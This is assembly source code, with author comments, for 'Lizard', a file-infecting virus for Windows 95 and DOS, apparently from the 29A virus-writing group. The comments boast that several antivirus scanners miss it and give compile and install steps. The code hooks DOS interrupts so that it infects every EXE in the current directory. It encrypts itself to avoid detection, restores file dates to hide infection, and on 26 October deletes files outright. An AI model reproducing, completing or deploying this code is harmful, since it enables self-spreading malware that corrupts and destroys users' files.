   ;-----------------------------------------------------------------------------
   ;Lizard by Reptile/29A (another version ;)
   ;-----------------------------------------------------------------------------

   ;                          ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ ÜÛÛÛÛÛÜ
   ;                          ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ ÛÛÛ
   ;                           ÜÜÜÛÛß ßÛÛÛÛÛÛ ÛÛÛÛÛÛÛ
   ;                          ÛÛÛÜÜÜÜ ÜÜÜÜÛÛÛ ÛÛÛ ÛÛÛ
   ;                          ÛÛÛÛÛÛÛ ÛÛÛÛÛÛß ÛÛÛ ÛÛÛ

   ;This is an encrypted vxd direct action dos exe infector (I added some anti-
   ;heuristics and other stuff and optimized the code of v1.0).

   ;When an infected file is run the virus decrypts itself, drops lzd.vxd to the
   ;available one of the three dirs and then returns back to the host. After the
   ;next reboot...

   ;When windoze 95 is starting, it loads the vxd (lzd.vxd) automatically coz
   ;it's in the '\iosubsys\' dir (Lizard doesn't need to modify the system.ini
   ;or the registry). Then the virus takes control and hooks the V86 interrupt
   ;chain. It executes on exec (4bh), create (3ch), ext. open (6ch), close (3eh)
   ;and on find first file (4eh) using direct action techniques to infect all
   ;dos exes in the current directory (*highly* infectious!). Lzd.vxd has a size
   ;of 7099 bytes (masm sux! :P ), but the victims are only increased by 1967 (!)
   ;bytes.

   ;Findvirus v7.75, AVP v3.0 and TBAV v8.03 (high heuristic sensitivity!) can't
   ;detect it (all for win95).

   ;Compiling lzd.vxd (win95 DDK):
   ;makefile

   ;Compiling rmlzd.inc:
   ;tasm /m2 rmlzd.asm
   ;tlink /t rmlzd.obj
   ;file2db rmlzd.com (or another db generator)
   ;modify rmlzd.dat

   ;To install copy lzd.vxd to one of the following dirs:
   ;- c:\windows\system\iosubsys
   ;- c:\win95\system\iosubsys
   ;- c:\windows.000\system\iosubsys
   ;...or start lizard.exe :)

   ;P.S.:
   ;Sandy: are u lucky now? ;)
   ;Jacky: thanx for testing it!
   ;GriYo: the stack stuff really didn't work :P

   ;P.P.S:
   ;TrY MaGiC MuShRoOmS...

   ;---[LZD.ASM]-----------------------------------------------------------------

   .386p

   .xlist
   include vmm.inc
   .list

   vxdhsize equ 701
   vxddsize equ 81
   vxdcsize equ 880
   esize equ encend - encstart
   vsize equ vend - start

   Declare_Virtual_Device LZD, 6, 66, LZD_Control, Undefined_Device_Id, \
   Undefined_Init_Order,,

   VxD_Locked_Data_Seg
   wcard db '*.e?e',0  ;*.l?z
   include rmlzd.inc    ;realmode code
   dflag db 0
   pflag db 0
   ndta db 43 dup (?)
   header db 26 dup (?)
   VxD_Locked_Data_Ends
   ;-----------------------------------------------------------------------------
   VxD_Locked_Code_Seg
   BeginProc LZD_Device_Init
   ;trigger
   mov ah,2ah  ;get date
   vxdint 21h
   ;live drazil si
   cmp dh,10   ;26.10.?
   jne npload
   cmp dl,26
   jne npload

   mov pflag,1 ;hehe

   npload:
   mov eax,21h ;install int 21h handler
   mov esi,offset32 int21h
   VMMcall Hook_V86_Int_Chain
   clc
   ret
   EndProc LZD_Device_Init
   ;-----------------------------------------------------------------------------
   BeginProc int21h
   cmp [ebp.Client_AH],4bh   ;exec
   je short ww
   cmp [ebp.Client_AH],3ch   ;create
   je short ww
   cmp [ebp.Client_AH],6ch   ;ext. open
   je short ww
   cmp [ebp.Client_AH],3eh   ;close
   je short ww
   cmp [ebp.Client_AH],4eh   ;find first
   je short ww
   jmp prevhook

   ww:
   Push_Client_State   ;save regs
   VMMcall Begin_Nest_Exec
   ;-----------------------------------------------------------------------------
   cmp dflag,1
   je done
   mov ax,3d02h   ;open lzd.vxd
   lea edx,dropname1   ;in the 'c:\windows\system\iosubsys' dir
   vxdint 21h
   jnc short rd

   mov ax,3d02h   ;open the vxd
   lea edx,dropname2   ;in the 'c:\win95\system\iosubsys' dir
   vxdint 21h
   jnc short rd

   mov ax,3d02h   ;open the vxd
   lea edx,dropname3   ;in the 'c:\windows.000\system\iosubsys' dir
   vxdint 21h
   jc ecsit  ;skip it

   rd:
   xchg ax,bx

   mov ah,3fh  ;store the header of the vxd
   mov cx,vxdhsize
   lea edx,vxdheader
   vxdint 21h

   mov ax,4201h    ;jmp over zeros
   xor cx,cx
   mov dx,3400
   vxdint 21h

   mov ah,3fh  ;store the vxddata
   mov cx,vxddsize
   lea edx,vxddata
   vxdint 21h

   mov ax,4201h    ;jmp over realmodecode and zeros
   xor cx,cx
   mov dx,2037
   vxdint 21h

   mov ah,3fh  ;store the vxdcode
   mov cx,vxdcsize
   lea edx,vxdcode
   vxdint 21h

   mov ah,3eh  ;close...
   vxdint 21h

   mov dflag,1 ;set flag
   ;-----------------------------------------------------------------------------
   done:
   mov ah,1ah  ;set dta
   lea edx,ndta
   vxdint 21h

   ffirst:
   mov ah,4eh  ;search for first exe
   jmp short w
   fnext:
   mov ah,4fh  ;find next exe
   w:
   mov cx,7
   lea edx,wcard   ;*.e?e
   vxdint 21h
   jc ecsit

   mov ax,4301h    ;set normal attribute
   mov cx,20h
   lea edx,[ndta + 30]
   vxdint 21h

   cmp pflag,1 ;sux0ring microsuckers
   jne pheeew  ;(the payload in v1.0 was a bit too destructive ;)

   evil:
   ;evil payload against the imperialism of microsoft!
   mov ah,41h  ;yhcrana
   lea edx,[ndta + 30]
   vxdint 21h
   jmp ecsit

   pheeew:
   mov ax,3d02h   ;open the victim
   lea edx,[ndta + 30]
   vxdint 21h
   jc fnext
   xchg ax,bx

   mov ah,3fh   ;read header
   mov cx,26
   lea edx,header
   vxdint 21h

   cmp word ptr [header],'ZM'  ;exe?
   jne cfile
   cmp word ptr [header + 0ch],0ffffh ;allocate all mem?
   jne cfile
   cmp word ptr [header + 18h],40h ;win exe?
   je cfile
   mov al,[header + 12h] ;infected?
   or al,al
   jne cfile

   ;save ss:sp
   mov ax,word ptr [header + 0eh]
   mov sseg,ax
   mov ax,word ptr [header + 10h]
   mov ssp,ax

   ;save cs:ip
   mov eax,dword ptr [header + 14h]
   mov csip,eax

   mov ax,4202h    ;eof
   xor cx,cx
   cwd
   vxdint 21h

   ;calc new cs:ip
   mov cx,16
   div cx
   sub ax,word ptr [header + 8]

   mov word ptr [header + 14h],dx
   mov word ptr [header + 16h],ax

   add edx,vend    ;calc stack

   mov word ptr [header + 0eh],ax
   mov word ptr [header + 10h],dx

   ;xor encryption
   rdnm:
   in al,40h
   or al,al
   je rdnm
   mov [encval],al ;save random value

   mov edi,offset32 encstart
   mov cx,esize
   xl:
   xor [edi],al
   inc edi
   loop xl

   ;write virus
   mov ah,40h
   mov cx,vsize
   mov edx,offset32 start
   vxdint 21h

   ;undo
   mov al,[encval]
   mov edi,offset32 encstart
   mov cx,esize

   xll:
   xor [edi],al
   inc edi
   loop xll

   mov ax,4202h    ;eof
   xor cx,cx
   cwd
   vxdint 21h

   mov cx,512  ;calc pages
   div cx
   or dx,dx
   jz short np
   inc ax
   np:
   mov word ptr [header + 4],ax
   mov word ptr [header + 2],dx

   mov ax,4200h    ;bof
   xor cx,cx
   cwd
   vxdint 21h

   rnd:
   in al,40h   ;set infection flag
   or al,al
   je rnd
   mov [header + 12h],al

   mov ah,40h   ;write new header
   mov cx,26
   lea edx,header
   vxdint 21h

   cfile:
   mov cl,byte ptr [ndta + 21] ;restore attribute
   lea edx,[ndta + 1eh]
   mov ax,4301h
   vxdint 21h

   mov cx,word ptr [ndta + 22] ;restore time/date
   mov dx,word ptr [ndta + 24]
   mov ax,5701
   vxdint 21h

   mov ah,3eh  ;close file
   vxdint 21h
   jmp fnext

   ecsit:
   VMMcall End_Nest_Exec
   Pop_Client_State

   prevhook:
   stc
   ret
   EndProc int21h
   ;-----------------------------------------------------------------------------
   BeginProc LZD_Control
   Control_Dispatch Init_Complete,LZD_Device_Init
   clc
   ret
   EndProc LZD_Control
   wb db 13,10,'Lizard by Reptile/29A',0
   VxD_Locked_Code_Ends
   End ;this is the end my only friend the end...
